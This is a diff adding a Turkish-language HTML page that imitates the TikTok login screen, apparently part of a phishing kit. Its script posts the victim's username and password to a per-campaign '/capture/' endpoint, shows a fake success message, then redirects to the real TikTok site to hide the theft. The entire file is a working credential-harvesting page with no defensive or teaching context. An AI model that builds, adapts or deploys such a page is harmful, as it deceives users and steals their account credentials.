@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yeni Videoları Keşfet | TikTok</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #000;
+            color: #fff;
+        }
+
+        .header {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            padding: 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 100;
+            background-color: rgba(0, 0, 0, 0.8);
+        }
+
+        .logo {
+            font-weight: bold;
+            font-size: 24px;
+        }
+
+        .tiktok-logo {
+            position: relative;
+            color: white;
+        }
+
+        .tiktok-logo::before {
+            content: "";
+            position: absolute;
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            border: 4px solid #fe2c55;
+            left: -4px;
+            top: -2px;
+        }
+
+        .tiktok-logo::after {
+            content: "";
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: #25f4ee;
+            right: -4px;
+            bottom: -4px;
+        }
+
+        .upload-btn {
+            background-color: #fe2c55;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .login-container {
+            display: flex;
+            min-height: 100vh;
+            align-items: center;
+            justify-content: center;
+            padding: 80px 20px 20px;
+        }
+
+        .login-box {
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .login-title {
+            font-size: 32px;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+
+        .login-subtitle {
+            color: rgba(255, 255, 255, 0.75);
+            margin-bottom: 24px;
+            font-size: 16px;
+        }
+
+        .login-options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .social-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 4px;
+            background: none;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .social-btn:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+
+        .social-btn i {
+            margin-right: 8px;
+            font-size: 20px;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: rgba(255, 255, 255, 0.2);
+        }
+
+        .divider span {
+            padding: 0 16px;
+            font-size: 14px;
+        }
+
+        .login-form input {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 16px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 4px;
+            color: white;
+            font-size: 16px;
+        }
+
+        .login-form input:focus {
+            outline: none;
+            border-color: #fe2c55;
+            background-color: rgba(254, 44, 85, 0.1);
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: #fe2c55;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 16px;
+        }
+
+        .login-btn:hover {
+            background-color: #ff3a63;
+        }
+
+        .forgot-password {
+            color: #25f4ee;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-bottom: 24px;
+        }
+
+        .signup-link {
+            color: rgba(255, 255, 255, 0.75);
+            font-size: 14px;
+            margin-top: 16px;
+        }
+
+        .signup-link a {
+            color: #fe2c55;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 24px;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 12px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 16px;
+            margin-bottom: 16px;
+        }
+
+        .footer-links a {
+            color: rgba(255, 255, 255, 0.5);
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            color: white;
+        }
+
+        .loading {
+            display: none;
+            margin: 10px auto;
+            width: 30px;
+            height: 30px;
+            border: 3px solid rgba(255, 255, 255, 0.2);
+            border-top: 3px solid #fe2c55;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo tiktok-logo">TikTok</div>
+        <button class="upload-btn">Video yükle</button>
+    </div>
+
+    <div class="login-container">
+        <div class="login-box">
+            <h1 class="login-title">TikTok'a Giriş Yap</h1>
+            <p class="login-subtitle">Hayatını kaydet ve eğlenceli anlarını paylaş</p>
+
+            <div class="login-options">
+                <button class="social-btn">
+                    <i class="fab fa-qrcode"></i> QR Kod ile Giriş Yap
+                </button>
+                <button class="social-btn">
+                    <i class="fab fa-facebook"></i> Facebook ile Devam Et
+                </button>
+                <button class="social-btn">
+                    <i class="fab fa-google"></i> Google ile Devam Et
+                </button>
+                <button class="social-btn">
+                    <i class="fab fa-twitter"></i> Twitter ile Devam Et
+                </button>
+            </div>
+
+            <div class="divider">
+                <span>veya</span>
+            </div>
+
+            <form class="login-form" id="login-form">
+                <input type="text" id="username" placeholder="Telefon / E-posta / Kullanıcı adı" required>
+                <input type="password" id="password" placeholder="Şifre" required>
+
+                <button type="submit" class="login-btn">Giriş Yap</button>
+                <div class="loading" id="loading"></div>
+
+                <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
+
+                <div class="signup-link">
+                    Hesabın yok mu? <a href="#">Kaydol</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Gizlilik Politikası</a>
+            <a href="#">Koşullar</a>
+            <a href="#">Çerez Politikası</a>
+            <a href="#">Yardım</a>
+            <a href="#">Kariyer</a>
+            <a href="#">İletişim</a>
+        </div>
+        <div>© 2023 TikTok</div>
+    </div>
+
+    <script>
+        const campaignId = window.location.pathname.substring(1);
+
+        document.getElementById('login-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            if (!username || !password) {
+                alert('Lütfen kullanıcı adı ve şifre girin!');
+                return;
+            }
+
+            document.getElementById('loading').style.display = 'block';
+
+            try {
+                const response = await fetch(`/capture/${campaignId}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        username: username,
+                        password: password,
+                        timestamp: new Date().toISOString(),
+                        platform: 'TikTok'
+                    })
+                });
+
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                    alert('Giriş başarılı! Yönlendiriliyorsunuz...');
+
+                    setTimeout(() => {
+                        window.location.href = 'https://www.tiktok.com/';
+                    }, 1000);
+                }, 2000);
+
+            } catch (error) {
+                document.getElementById('loading').style.display = 'none';
+                alert('Bir hata oluştu. Lütfen tekrar deneyin.');
+            }
+        });
+
+        // QR code button
+        document.querySelectorAll('.social-btn')[0].addEventListener('click', function() {
+            alert('QR kod ile giriş özelliği şu anda kullanılamıyor.');
+        });
+    </script>
+</body>
+</html>
